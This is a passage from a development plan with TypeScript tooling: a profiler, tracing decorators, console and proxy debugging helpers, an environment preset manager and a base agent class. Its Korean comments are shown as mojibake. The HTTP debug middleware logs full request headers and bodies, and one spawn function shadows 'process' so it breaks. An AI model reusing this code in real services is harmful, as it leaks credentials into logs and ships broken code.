    // ë…¸ë“œ ë§µ ìƒì„±
    profile.nodes.forEach((node: any) => {
      nodes.set(node.id, {
        ...node,
        selfTime: 0,
        totalTime: 0,
        children: []
      });
    });
    
    // ë¶€ëª¨-ìì‹ ê´€ê³„ ì„¤ì •
    profile.nodes.forEach((node: any) => {
      if (node.parent) {
        const parent = nodes.get(node.parent);
        if (parent) {
          parent.children.push(node.id);
        }
      }
    });
    
    // ì‹œê°„ ê³„ì‚°
    if (profile.samples && profile.timeDeltas) {
      let currentTime = profile.startTime;
      
      profile.samples.forEach((sample: number, index: number) => {
        const node = nodes.get(sample);
        if (node) {
          const delta = profile.timeDeltas[index];
          node.selfTime += delta;
          totalTime += delta;
          
          // ë¶€ëª¨ ë…¸ë“œë“¤ì˜ totalTime ì—…ë°ì´íŠ¸
          let current = node;
          while (current) {
            current.totalTime += delta;
            current = nodes.get(current.parent);
          }
        }
        
        currentTime += profile.timeDeltas[index];
      });
    }
    
    // í•«ìŠ¤íŒŸ ì°¾ê¸°
    const hotspots = Array.from(nodes.values())
      .filter(node => node.selfTime > 0)
      .sort((a, b) => b.selfTime - a.selfTime)
      .slice(0, 10)
      .map(node => ({
        functionName: node.callFrame.functionName || '(anonymous)',
        url: node.callFrame.url,
        lineNumber: node.callFrame.lineNumber,
        selfTime: node.selfTime,
        totalTime: node.totalTime,
        percentage: (node.selfTime / totalTime) * 100
      }));
    
    return {
      totalTime,
      hotspots,
      profile
    };
  }
  
  // Inspector ì„¸ì…˜ ëª…ë ¹ ì‹¤í–‰
  private post(method: string, params?: any): Promise<any> {
    return new Promise((resolve, reject) => {
      this.session.post(method, params, (err, result) => {
        if (err) reject(err);
        else resolve(result);
      });
    });
  }
  
  // ìŠ¤í¬ë¦½íŠ¸ ID ê°€ì ¸ì˜¤ê¸°
  private async getScriptId(filename: string): Promise<string> {
    const result = await this.post('Debugger.enable');
    // ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” ìŠ¤í¬ë¦½íŠ¸ ëª©ë¡ì—ì„œ íŒŒì¼ëª…ìœ¼ë¡œ ê²€ìƒ‰
    return '1'; // ì„ì‹œ
  }
}

// ì‹¤í–‰ ì¶”ì ê¸°
export class ExecutionTracer {
  private traces: Map<string, Trace[]> = new Map();
  
  // í•¨ìˆ˜ ì¶”ì  ë°ì½”ë ˆì´í„°
  trace(options: TraceOptions = {}) {
    return (target: any, propertyKey: string, descriptor: PropertyDescriptor) => {
      const originalMethod = descriptor.value;
      
      descriptor.value = async function(...args: any[]) {
        const traceId = traceContext.getStore()?.traceId || generateTraceId();
        const spanId = generateSpanId();
        const startTime = performance.now();
        
        const trace: Trace = {
          traceId,
          spanId,
          method: `${target.constructor.name}.${propertyKey}`,
          args: options.logArgs ? args : undefined,
          startTime,
          metadata: {}
        };
        
        // ì¶”ì  ì‹œì‘
        if (options.log) {
          console.log(chalk.blue(`â†’ ${trace.method}`), {
            traceId,
            spanId,
            args: options.logArgs ? args : '[hidden]'
          });
        }
        
        try {
          // ì»¨í…ìŠ¤íŠ¸ ì„¤ì •
          const result = await traceContext.run(
            {
              traceId,
              spanId,
              parentSpanId: traceContext.getStore()?.spanId,
              startTime,
              metadata: {}
            },
            async () => await originalMethod.apply(this, args)
          );
          
          trace.endTime = performance.now();
          trace.duration = trace.endTime - trace.startTime;
          trace.result = options.logResult ? result : undefined;
          trace.success = true;
          
          // ì¶”ì  ì™„ë£Œ
          if (options.log) {
            console.log(
              chalk.green(`â† ${trace.method}`),
              chalk.gray(`(${trace.duration.toFixed(2)}ms)`),
              {
                traceId,
                spanId,
                result: options.logResult ? result : '[hidden]'
              }
            );
          }
          
          return result;
          
        } catch (error) {
          trace.endTime = performance.now();
          trace.duration = trace.endTime - trace.startTime;
          trace.error = error;
          trace.success = false;
          
          // ì—ëŸ¬ ì¶”ì 
          if (options.log) {
            console.log(
              chalk.red(`âœ— ${trace.method}`),
              chalk.gray(`(${trace.duration.toFixed(2)}ms)`),
              {
                traceId,
                spanId,
                error: error.message
              }
            );
          }
          
          throw error;
          
        } finally {
          // ì¶”ì  ì €ì¥
          this.saveTrace(trace);
        }
      };
      
      return descriptor;
    };
  }
  
  // ìˆ˜ë™ ì¶”ì 
  async traceExecution<T>(
    name: string,
    fn: () => Promise<T>,
    metadata?: Record<string, any>
  ): Promise<T> {
    const traceId = traceContext.getStore()?.traceId || generateTraceId();
    const spanId = generateSpanId();
    const startTime = performance.now();
    
    console.log(chalk.blue(`â†’ ${name}`), { traceId, spanId });
    
    try {
      const result = await traceContext.run(
        {
          traceId,
          spanId,
          parentSpanId: traceContext.getStore()?.spanId,
          startTime,
          metadata: metadata || {}
        },
        fn
      );
      
      const duration = performance.now() - startTime;
      console.log(
        chalk.green(`â† ${name}`),
        chalk.gray(`(${duration.toFixed(2)}ms)`)
      );
      
      return result;
      
    } catch (error) {
      const duration = performance.now() - startTime;
      console.log(
        chalk.red(`âœ— ${name}`),
        chalk.gray(`(${duration.toFixed(2)}ms)`),
        error
      );
      throw error;
    }
  }
  
  // ì¶”ì  ì €ì¥
  private saveTrace(trace: Trace): void {
    if (!this.traces.has(trace.traceId)) {
      this.traces.set(trace.traceId, []);
    }
    
    this.traces.get(trace.traceId)!.push(trace);
  }
  
  // ì¶”ì  ì¡°íšŒ
  getTrace(traceId: string): Trace[] | undefined {
    return this.traces.get(traceId);
  }
  
  // ì¶”ì  ì‹œê°í™”
  visualizeTrace(traceId: string): string {
    const traces = this.getTrace(traceId);
    if (!traces) return 'Trace not found';
    
    const sorted = traces.sort((a, b) => a.startTime - b.startTime);
    const lines: string[] = [''];
    
    sorted.forEach((trace, index) => {
      const indent = '  '.repeat(trace.metadata.depth || 0);
      const duration = trace.duration?.toFixed(2) || '?';
      const status = trace.success ? 'âœ“' : 'âœ—';
      
      lines.push(
        `${indent}${status} ${trace.method} (${duration}ms)`
      );
    });
    
    return lines.join('\n');
  }
}

// í–¥ìƒëœ ì½˜ì†” ë¡œê¹…
export class EnhancedConsole {
  private originalConsole = { ...console };
  
  install(): void {
    // console.log ì˜¤ë²„ë¼ì´ë“œ
    console.log = (...args: any[]) => {
      const enhanced = this.enhance(args);
      this.originalConsole.log(...enhanced);
    };
    
    // console.error ì˜¤ë²„ë¼ì´ë“œ
    console.error = (...args: any[]) => {
      const enhanced = this.enhance(args, 'error');
      this.originalConsole.error(...enhanced);
    };
    
    // console.table ê°œì„ 
    const originalTable = console.table;
    console.table = (data: any, columns?: string[]) => {
      if (typeof data === 'object' && data !== null) {
        // ë” ë‚˜ì€ í¬ë§·íŒ…
        this.originalConsole.log(chalk.cyan('â”Œâ”€ Table â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”'));
        originalTable.call(console, data, columns);
        this.originalConsole.log(chalk.cyan('â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜'));
      } else {
        originalTable.call(console, data, columns);
      }
    };
  }
  
  private enhance(args: any[], type: string = 'log'): any[] {
    const ctx = traceContext.getStore();
    const timestamp = new Date().toISOString();
    
    // ì»¬ëŸ¬ ë° í¬ë§·íŒ…
    const prefix = type === 'error' 
      ? chalk.red(`[${timestamp}]`)
      : chalk.gray(`[${timestamp}]`);
    
    // íŠ¸ë ˆì´ìŠ¤ ì •ë³´ ì¶”ê°€
    const traceInfo = ctx 
      ? chalk.dim(`[${ctx.traceId.slice(0, 8)}/${ctx.spanId.slice(0, 8)}]`)
      : '';
    
    // ê°ì²´ ê¹Šì€ ê²€ì‚¬
    const enhanced = args.map(arg => {
      if (typeof arg === 'object' && arg !== null) {
        return util.inspect(arg, {
          colors: true,
          depth: 4,
          maxArrayLength: 100,
          breakLength: 80,
          compact: false
        });
      }
      return arg;
    });
    
    return [prefix, traceInfo, ...enhanced];
  }
}

// ë””ë²„ê·¸ í”„ë¡ì‹œ
export function createDebugProxy<T extends object>(
  target: T,
  name: string = 'Object'
): T {
  return new Proxy(target, {
    get(obj, prop, receiver) {
      const value = Reflect.get(obj, prop, receiver);
      console.log(chalk.yellow(`[Proxy:${name}] GET`), prop, 'â†’', value);
      return value;
    },
    
    set(obj, prop, value, receiver) {
      console.log(chalk.yellow(`[Proxy:${name}] SET`), prop, 'â†', value);
      return Reflect.set(obj, prop, value, receiver);
    },
    
    deleteProperty(obj, prop) {
      console.log(chalk.yellow(`[Proxy:${name}] DELETE`), prop);
      return Reflect.deleteProperty(obj, prop);
    },
    
    has(obj, prop) {
      const exists = Reflect.has(obj, prop);
      console.log(chalk.yellow(`[Proxy:${name}] HAS`), prop, 'â†’', exists);
      return exists;
    }
  });
}

// íƒ€ì… ì •ì˜
interface Breakpoint {
  file: string;
  line: number;
  condition?: string;
  logMessage?: string;
  hitCount: number;
}

interface CPUProfile {
  totalTime: number;
  hotspots: Array<{
    functionName: string;
    url: string;
    lineNumber: number;
    selfTime: number;
    totalTime: number;
    percentage: number;
  }>;
  profile: any;
}

interface TraceOptions {
  log?: boolean;
  logArgs?: boolean;
  logResult?: boolean;
}

interface Trace {
  traceId: string;
  spanId: string;
  method: string;
  args?: any[];
  result?: any;
  error?: any;
  startTime: number;
  endTime?: number;
  duration?: number;
  success?: boolean;
  metadata: Record<string, any>;
}

// ìœ í‹¸ë¦¬í‹° í•¨ìˆ˜
function generateTraceId(): string {
  return crypto.randomBytes(16).toString('hex');
}

function generateSpanId(): string {
  return crypto.randomBytes(8).toString('hex');
}

// ë””ë²„ê¹… ë¯¸ë“¤ì›¨ì–´
export function debuggingMiddleware() {
  return (req: Request, res: Response, next: NextFunction) => {
    const traceId = req.headers['x-trace-id'] as string || generateTraceId();
    const spanId = generateSpanId();
    
    // ìš”ì²­ ë¡œê¹…
    console.log(chalk.blue('â†’ HTTP Request'), {
      method: req.method,
      path: req.path,
      traceId,
      spanId,
      headers: req.headers,
      body: req.body
    });
    
    // íŠ¸ë ˆì´ìŠ¤ ì»¨í…ìŠ¤íŠ¸ ì„¤ì •
    traceContext.run(
      {
        traceId,
        spanId,
        startTime: Date.now(),
        metadata: {
          method: req.method,
          path: req.path
        }
      },
      () => {
        // ì‘ë‹µ ë¡œê¹…
        const originalSend = res.send;
        res.send = function(data: any) {
          console.log(chalk.green('â† HTTP Response'), {
            traceId,
            spanId,
            statusCode: res.statusCode,
            body: data
          });
          
          return originalSend.call(this, data);
        };
        
        next();
      }
    );
  };
}
```

### SubTask 0.12.5: ê°œë°œ í™˜ê²½ í”„ë¦¬ì…‹ ê´€ë¦¬
**ëª©í‘œ**: ë‹¤ì–‘í•œ ê°œë°œ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ìœ„í•œ í™˜ê²½ í”„ë¦¬ì…‹

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/dev/environment-presets.ts
import { promises as fs } from 'fs';
import path from 'path';
import yaml from 'js-yaml';
import dotenv from 'dotenv';

// í™˜ê²½ í”„ë¦¬ì…‹ ë§¤ë‹ˆì €
export class EnvironmentPresetManager {
  private presets: Map<string, EnvironmentPreset> = new Map();
  private currentPreset?: string;
  
  constructor(private presetsDir: string = './config/presets') {}
  
  // í”„ë¦¬ì…‹ ë¡œë“œ
  async loadPresets(): Promise<void> {
    const files = await fs.readdir(this.presetsDir);
    
    for (const file of files) {
      if (file.endsWith('.yaml') || file.endsWith('.yml')) {
        const content = await fs.readFile(
          path.join(this.presetsDir, file),
          'utf-8'
        );
        
        const preset = yaml.load(content) as EnvironmentPreset;
        const name = path.basename(file, path.extname(file));
        
        this.presets.set(name, preset);
        console.log(`ğŸ“¦ Loaded preset: ${name}`);
      }
    }
  }
  
  // í”„ë¦¬ì…‹ í™œì„±í™”
  async activatePreset(name: string): Promise<void> {
    const preset = this.presets.get(name);
    if (!preset) {
      throw new Error(`Preset '${name}' not found`);
    }
    
    console.log(`ğŸš€ Activating preset: ${name}`);
    
    // í™˜ê²½ ë³€ìˆ˜ ì„¤ì •
    await this.applyEnvironmentVariables(preset.env);
    
    // ì„œë¹„ìŠ¤ ì‹œì‘
    await this.startServices(preset.services);
    
    // Mock ì„¤ì •
    await this.configureMocks(preset.mocks);
    
    // ì´ˆê¸° ë°ì´í„° ì„¤ì •
    await this.loadInitialData(preset.data);
    
    // ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
    await this.runScripts(preset.scripts?.setup);
    
    this.currentPreset = name;
    console.log(`âœ… Preset '${name}' activated`);
  }
  
  // í”„ë¦¬ì…‹ ë¹„í™œì„±í™”
  async deactivatePreset(): Promise<void> {
    if (!this.currentPreset) return;
    
    const preset = this.presets.get(this.currentPreset);
    if (!preset) return;
    
    console.log(`ğŸ›‘ Deactivating preset: ${this.currentPreset}`);
    
    // ì •ë¦¬ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
    await this.runScripts(preset.scripts?.teardown);
    
    // ì„œë¹„ìŠ¤ ì¤‘ì§€
    await this.stopServices(preset.services);
    
    this.currentPreset = undefined;
  }
  
  // í™˜ê²½ ë³€ìˆ˜ ì ìš©
  private async applyEnvironmentVariables(
    env?: Record<string, string | number | boolean>
  ): Promise<void> {
    if (!env) return;
    
    // í˜„ì¬ í™˜ê²½ ë³€ìˆ˜ ë°±ì—…
    const backup = { ...process.env };
    
    // ìƒˆ í™˜ê²½ ë³€ìˆ˜ ì ìš©
    Object.entries(env).forEach(([key, value]) => {
      process.env[key] = String(value);
    });
    
    // .env íŒŒì¼ ì—…ë°ì´íŠ¸
    const envPath = path.join(process.cwd(), '.env.preset');
    const envContent = Object.entries(env)
      .map(([key, value]) => `${key}=${value}`)
      .join('\n');
    
    await fs.writeFile(envPath, envContent);
    dotenv.config({ path: envPath, override: true });
  }
  
  // ì„œë¹„ìŠ¤ ì‹œì‘
  private async startServices(services?: ServiceConfig[]): Promise<void> {
    if (!services) return;
    
    for (const service of services) {
      console.log(`ğŸ”§ Starting service: ${service.name}`);
      
      switch (service.type) {
        case 'docker':
          await this.startDockerService(service);
          break;
        case 'process':
          await this.startProcessService(service);
          break;
        case 'mock':
          await this.startMockService(service);
          break;
      }
    }
  }
  
  // Docker ì„œë¹„ìŠ¤ ì‹œì‘
  private async startDockerService(service: ServiceConfig): Promise<void> {
    const { spawn } = require('child_process');
    
    const args = ['run', '--rm', '-d'];
    
    // í¬íŠ¸ ë§¤í•‘
    if (service.ports) {
      service.ports.forEach(port => {
        args.push('-p', port);
      });
    }
    
    // í™˜ê²½ ë³€ìˆ˜
    if (service.env) {
      Object.entries(service.env).forEach(([key, value]) => {
        args.push('-e', `${key}=${value}`);
      });
    }
    
    // ì»¨í…Œì´ë„ˆ ì´ë¦„
    args.push('--name', `t-dev-${service.name}`);
    
    // ì´ë¯¸ì§€
    args.push(service.image!);
    
    const docker = spawn('docker', args);
    
    docker.on('error', (error) => {
      console.error(`Failed to start ${service.name}:`, error);
    });
  }
  
  // í”„ë¡œì„¸ìŠ¤ ì„œë¹„ìŠ¤ ì‹œì‘
  private async startProcessService(service: ServiceConfig): Promise<void> {
    const { spawn } = require('child_process');
    
    const [command, ...args] = service.command!.split(' ');
    
    const process = spawn(command, args, {
      env: { ...process.env, ...service.env },
      cwd: service.cwd,
      detached: true
    });
    
    process.unref();
  }
  
  // Mock ì„œë¹„ìŠ¤ ì‹œì‘
  private async startMockService(service: ServiceConfig): Promise<void> {
    const { MockServiceManager } = await import('./mock-system');
    const mockManager = new MockServiceManager();
    
    if (service.name === 'all') {
      await mockManager.startAll();
    } else {
      // íŠ¹ì • ì„œë¹„ìŠ¤ë§Œ ì‹œì‘
      await mockManager[`start${service.name}Mock`]();
    }
  }
  
  // ì„œë¹„ìŠ¤ ì¤‘ì§€
  private async stopServices(services?: ServiceConfig[]): Promise<void> {
    if (!services) return;
    
    for (const service of services) {
      console.log(`ğŸ›‘ Stopping service: ${service.name}`);
      
      if (service.type === 'docker') {
        const { exec } = require('child_process');
        exec(`docker stop t-dev-${service.name}`);
      }
    }
  }
  
  // Mock ì„¤ì •
  private async configureMocks(mocks?: MockConfig): Promise<void> {
    if (!mocks) return;
    
    // Mock ì‘ë‹µ ì„¤ì •
    if (mocks.responses) {
      // ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” Mock ì‹œìŠ¤í…œì— ì‘ë‹µ ì„¤ì •
    }
    
    // ì§€ì—° ì„¤ì •
    if (mocks.latency) {
      process.env.MOCK_LATENCY_MIN = String(mocks.latency.min);
      process.env.MOCK_LATENCY_MAX = String(mocks.latency.max);
    }
    
    // ì—ëŸ¬ ì‹œë®¬ë ˆì´ì…˜
    if (mocks.errors) {
      process.env.MOCK_ERROR_RATE = String(mocks.errors.rate);
    }
  }
  
  // ì´ˆê¸° ë°ì´í„° ë¡œë“œ
  private async loadInitialData(data?: DataConfig): Promise<void> {
    if (!data) return;
    
    console.log('ğŸ“Š Loading initial data...');
    
    // íŒŒì¼ì—ì„œ ë¡œë“œ
    if (data.files) {
      for (const file of data.files) {
        const content = await fs.readFile(file, 'utf-8');
        const items = JSON.parse(content);
        
        // ë°ì´í„°ë² ì´ìŠ¤ì— ì‚½ì…
        await this.insertData(data.target, items);
      }
    }
    
    // ìƒì„±ê¸°ë¡œ ìƒì„±
    if (data.generators) {
      for (const generator of data.generators) {
        const { generateTestData } = await import('./test-data-generator');
        const items = await generateTestData(generator.type, generator.count);
        
        await this.insertData(data.target, items);
      }
    }
  }
  
  // ë°ì´í„° ì‚½ì…
  private async insertData(target: string, items: any[]): Promise<void> {
    // ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” DynamoDB ë˜ëŠ” ë‹¤ë¥¸ ë°ì´í„°ë² ì´ìŠ¤ì— ì‚½ì…
    console.log(`ğŸ’¾ Inserted ${items.length} items into ${target}`);
  }
  
  // ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
  private async runScripts(scripts?: string[]): Promise<void> {
    if (!scripts) return;
    
    for (const script of scripts) {
      console.log(`ğŸ“œ Running script: ${script}`);
      
      const { exec } = require('child_process');
      const { promisify } = require('util');
      const execAsync = promisify(exec);
      
      try {
        const { stdout, stderr } = await execAsync(script);
        if (stdout) console.log(stdout);
        if (stderr) console.error(stderr);
      } catch (error) {
        console.error(`Script failed: ${script}`, error);
      }
    }
  }
  
  // í”„ë¦¬ì…‹ ëª©ë¡
  listPresets(): PresetInfo[] {
    return Array.from(this.presets.entries()).map(([name, preset]) => ({
      name,
      description: preset.description,
      active: name === this.currentPreset
    }));
  }
  
  // í”„ë¦¬ì…‹ ìƒì„±
  async createPreset(name: string, config: EnvironmentPreset): Promise<void> {
    const filePath = path.join(this.presetsDir, `${name}.yaml`);
    const content = yaml.dump(config);
    
    await fs.writeFile(filePath, content);
    this.presets.set(name, config);
    
    console.log(`âœ… Created preset: ${name}`);
  }
}

// í”„ë¦¬ì…‹ íƒ€ì… ì •ì˜
interface EnvironmentPreset {
  name: string;
  description: string;
  env?: Record<string, string | number | boolean>;
  services?: ServiceConfig[];
  mocks?: MockConfig;
  data?: DataConfig;
  scripts?: {
    setup?: string[];
    teardown?: string[];
  };
}

interface ServiceConfig {
  name: string;
  type: 'docker' | 'process' | 'mock';
  image?: string;
  command?: string;
  ports?: string[];
  env?: Record<string, string>;
  cwd?: string;
}

interface MockConfig {
  enabled: boolean;
  services?: string[];
  responses?: Record<string, any>;
  latency?: {
    min: number;
    max: number;
  };
  errors?: {
    rate: number;
    types?: string[];
  };
}

interface DataConfig {
  target: string;
  files?: string[];
  generators?: Array<{
    type: string;
    count: number;
    options?: any;
  }>;
}

interface PresetInfo {
  name: string;
  description: string;
  active: boolean;
}

// í”„ë¦¬ì…‹ ì˜ˆì‹œ
const examplePresets = {
  'minimal': {
    name: 'minimal',
    description: 'Minimal setup for quick development',
    env: {
      NODE_ENV: 'development',
      USE_MOCKS: false,
      LOG_LEVEL: 'debug'
    },
    services: [
      {
        name: 'dynamodb',
        type: 'docker',
        image: 'amazon/dynamodb-local',
        ports: ['8000:8000']
      }
    ]
  },
  
  'full-mocks': {
    name: 'full-mocks',
    description: 'All services mocked for offline development',
    env: {
      NODE_ENV: 'development',
      USE_MOCKS: true,
      MOCK_LATENCY: true
    },
    mocks: {
      enabled: true,
      services: ['bedrock', 'dynamodb', 's3', 'external'],
      latency: {
        min: 100,
        max: 500
      }
    },
    data: {
      target: 'dynamodb',
      generators: [
        { type: 'projects', count: 50 },
        { type: 'components', count: 200 }
      ]
    }
  },
  
  'integration-test': {
    name: 'integration-test',
    description: 'Environment for integration testing',
    env: {
      NODE_ENV: 'test',
      USE_MOCKS: true,
      LOG_LEVEL: 'error'
    },
    services: [
      {
        name: 'dynamodb',
        type: 'docker',
        image: 'amazon/dynamodb-local',
        ports: ['8000:8000']
      },
      {
        name: 'redis',
        type: 'docker',
        image: 'redis:7-alpine',
        ports: ['6379:6379']
      }
    ],
    scripts: {
      setup: [
        'npm run db:migrate:test',
        'npm run seed:test'
      ],
      teardown: [
        'npm run db:clean:test'
      ]
    }
  },
  
  'performance-test': {
    name: 'performance-test',
    description: 'Environment for performance testing',
    env: {
      NODE_ENV: 'production',
      USE_MOCKS: false,
      ENABLE_PROFILING: true,
      LOG_LEVEL: 'warn'
    },
    services: [
      {
        name: 'dynamodb',
        type: 'docker',
        image: 'amazon/dynamodb-local',
        ports: ['8000:8000'],
        env: {
          JAVA_OPTS: '-Xmx2048m'
        }
      }
    ],
    data: {
      target: 'dynamodb',
      generators: [
        { type: 'projects', count: 1000 },
        { type: 'components', count: 5000 }
      ]
    },
    scripts: {
      setup: [
        'npm run build',
        'npm run optimize'
      ]
    }
  }
};

// CLI ëª…ë ¹ì–´
export function setupPresetCLI(program: any): void {
  const presetCmd = program
    .command('preset')
    .description('Manage development environment presets');
  
  presetCmd
    .command('list')
    .description('List available presets')
    .action(async () => {
      const manager = new EnvironmentPresetManager();
      await manager.loadPresets();
      
      const presets = manager.listPresets();
      console.table(presets);
    });
  
  presetCmd
    .command('activate <name>')
    .description('Activate a preset')
    .action(async (name: string) => {
      const manager = new EnvironmentPresetManager();
      await manager.loadPresets();
      await manager.activatePreset(name);
    });
  
  presetCmd
    .command('deactivate')
    .description('Deactivate current preset')
    .action(async () => {
      const manager = new EnvironmentPresetManager();
      await manager.deactivatePreset();
    });
  
  presetCmd
    .command('create <name>')
    .description('Create a new preset')
    .action(async (name: string) => {
      // ëŒ€í™”í˜• í”„ë¦¬ì…‹ ìƒì„±
      const inquirer = require('inquirer');
      
      const answers = await inquirer.prompt([
        {
          type: 'input',
          name: 'description',
          message: 'Preset description:'
        },
        {
          type: 'checkbox',
          name: 'services',
          message: 'Select services:',
          choices: ['dynamodb', 'redis', 'elasticsearch', 'mocks']
        },
        {
          type: 'confirm',
          name: 'useMocks',
          message: 'Enable mocking?'
        }
      ]);
      
      const preset: EnvironmentPreset = {
        name,
        description: answers.description,
        env: {
          NODE_ENV: 'development',
          USE_MOCKS: answers.useMocks
        },
        services: answers.services.map((s: string) => ({
          name: s,
          type: s === 'mocks' ? 'mock' : 'docker',
          image: s === 'dynamodb' ? 'amazon/dynamodb-local' :
                 s === 'redis' ? 'redis:7-alpine' :
                 s === 'elasticsearch' ? 'elasticsearch:8.11.0' : undefined
        }))
      };
      
      const manager = new EnvironmentPresetManager();
      await manager.createPreset(name, preset);
    });
}
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- í”„ë¦¬ì…‹ ë””ë ‰í† ë¦¬ ìƒì„±: `mkdir -p config/presets`
- ê¸°ë³¸ í”„ë¦¬ì…‹ YAML íŒŒì¼ ìƒì„±
- ê°œë°œ ì‹œë‚˜ë¦¬ì˜¤ë³„ í”„ë¦¬ì…‹ êµ¬ì„±
- `npm run dev:preset minimal` ê°™ì€ ìŠ¤í¬ë¦½íŠ¸ ì¶”ê°€

---

## Task 0.13: ì—ì´ì „íŠ¸ ê°œë°œ í™˜ê²½ ì„¤ì •

### SubTask 0.13.1: ì—ì´ì „íŠ¸ í”„ë ˆì„ì›Œí¬ ê¸°ì´ˆ ì„¤ì •
**ëª©í‘œ**: 9ê°œ í•µì‹¬ ì—ì´ì „íŠ¸ ê°œë°œì„ ìœ„í•œ ê¸°ë³¸ í”„ë ˆì„ì›Œí¬ êµ¬ì„±

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/agents/framework/base-agent.ts
import { EventEmitter } from 'events';
import { v4 as uuidv4 } from 'uuid';
import { Logger } from 'winston';
import { metrics } from '../../utils/monitoring';

export interface AgentContext {
  projectId: string;
  userId: string;
  sessionId: string;
  parentAgent?: string;
  metadata: Record<string, any>;
}

export interface AgentMessage {
  id: string;
  type: 'request' | 'response' | 'event' | 'error';
  source: string;
  target: string;
  payload: any;
  timestamp: Date;
  correlationId?: string;
}

export interface AgentCapability {
  name: string;
  description: string;
  inputSchema: any;
  outputSchema: any;
  version: string;
}

export abstract class BaseAgent extends EventEmitter {
  protected readonly id: string;
  protected readonly name: string;
  protected readonly version: string;
  protected readonly logger: Logger;
  protected context?: AgentContext;
  protected capabilities: Map<string, AgentCapability> = new Map();
  protected status: 'idle' | 'busy' | 'error' = 'idle';
  protected metrics: any;
  
  constructor(
    name: string,
    version: string,
    logger: Logger
  ) {
    super();
    this.id = `${name}-${uuidv4()}`;
    this.name = name;
    this.version = version;
    this.logger = logger;
    this.metrics = metrics;
    
    this.initialize();
  }
  
  protected abstract initialize(): void;
  protected abstract process(message: AgentMessage): Promise<any>;
  
  // ì—ì´ì „íŠ¸ ìƒëª…ì£¼ê¸° ë©”ì„œë“œ
  async start(context: AgentContext): Promise<void> {
    this.context = context;
    this.status = 'idle';
    
    this.logger.info(`Agent ${this.name} started`, {
      agentId: this.id,
      context
    });
    
    this.metrics.increment('agent.started', 1, [`agent:${this.name}`]);
    this.emit('started', { agentId: this.id, context });
    
    await this.onStart();
  }
  
  async stop(): Promise<void> {
    this.status = 'idle';
    
    this.logger.info(`Agent ${this.name} stopped`, {
      agentId: this.id
    });
    
    this.metrics.increment('agent.stopped', 1, [`agent:${this.name}`]);
    this.emit('stopped', { agentId: this.id });
    
    await this.onStop();
  }
  
  // ë©”ì‹œì§€ ì²˜ë¦¬
  async handleMessage(message: AgentMessage): Promise<AgentMessage> {
    const startTime = Date.now();
    this.status = 'busy';
    
    try {
      this.logger.debug(`Agent ${this.name} processing message`, {
        agentId: this.id,
        messageId: message.id,
        type: message.type
      });
      
      const result = await this.process(message);
      
      const response: AgentMessage = {
        id: uuidv4(),
        type: 'response',
        source: this.id,
        target: message.source,
        payload: result,
        timestamp: new Date(),
        correlationId: message.id
      };
      
      this.metrics.timing('agent.processing_time', Date.now() - startTime, [
        `agent:${this.name}`,
        `message_type:${message.type}`
      ]);
      
      this.status = 'idle';
      return response;
      
    } catch (error) {
      this.status = 'error';
      this.logger.error(`Agent ${this.name} error`, {
        agentId: this.id,
        messageId: message.id,
        error
      });
      
      this.metrics.increment('agent.errors', 1, [`agent:${this.name}`]);
      
      return {
        id: uuidv4(),
        type: 'error',
        source: this.id,
        target: message.source,
        payload: { error: error.message },
        timestamp: new Date(),
        correlationId: message.id
      };
    }
  }
  
  // ëŠ¥ë ¥(Capability) ê´€ë¦¬
  registerCapability(capability: AgentCapability): void {
    this.capabilities.set(capability.name, capability);
    this.logger.info(`Capability registered: ${capability.name}`, {
      agentId: this.id,
      capability
    });
  }
  
  getCapabilities(): AgentCapability[] {
    return Array.from(this.capabilities.values());
  }
  
  // ìƒíƒœ ê´€ë¦¬
  getStatus(): string {
    return this.status;
  }
  
  getMetrics(): any {
    return {
      agentId: this.id,
      name: this.name,
      status: this.status,
      capabilities: this.getCapabilities().length
    };
  }
  
  // Hook ë©”ì„œë“œë“¤ (í•˜ìœ„ í´ë˜ìŠ¤ì—ì„œ êµ¬í˜„)
  protected async onStart(): Promise<void> {}
  protected async onStop(): Promise<void> {}
}
```

### SubTask 0.13.2: ì—ì´ì „íŠ¸ í†µì‹  í”„ë¡œí† ì½œ ì„¤ì •
**ëª©í‘œ**: ì—ì´ì „íŠ¸ ê°„ íš¨ìœ¨ì ì¸ í†µì‹ ì„ ìœ„í•œ í”„ë¡œí† ì½œ ì •ì˜

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/agents/framework/communication.ts
import { EventEmitter } from 'events';
import Redis from 'ioredis';
import { AgentMessage } from './base-agent';

export interface MessageBus {
  publish(channel: string, message: AgentMessage): Promise<void>;
  subscribe(channel: string, handler: (message: AgentMessage) => void): void;
  unsubscribe(channel: string): void;
}

// Redis ê¸°ë°˜ ë©”ì‹œì§€ ë²„ìŠ¤
export class RedisMessageBus implements MessageBus {
  private publisher: Redis;
  private subscriber: Redis;
  private handlers: Map<string, Set<(message: AgentMessage) => void>> = new Map();
  
  constructor(redisUrl: string) {
    this.publisher = new Redis(redisUrl);
    this.subscriber = new Redis(redisUrl);
    
    this.subscriber.on('message', (channel, data) => {
      const message = JSON.parse(data) as AgentMessage;
      const channelHandlers = this.handlers.get(channel);
      
      if (channelHandlers) {
        channelHandlers.forEach(handler => handler(message));
      }
    });
  }
  
  async publish(channel: string, message: AgentMessage): Promise<void> {
    await this.publisher.publish(channel, JSON.stringify(message));
  }
  
  subscribe(channel: string, handler: (message: AgentMessage) => void): void {
    if (!this.handlers.has(channel)) {
      this.handlers.set(channel, new Set());
      this.subscriber.subscribe(channel);
    }
    
    this.handlers.get(channel)!.add(handler);
  }
  
  unsubscribe(channel: string): void {
    this.handlers.delete(channel);
    this.subscriber.unsubscribe(channel);
  }
}

// ì—ì´ì „íŠ¸ í†µì‹  ë§¤ë‹ˆì €
export class AgentCommunicationManager {
  private messageBus: MessageBus;
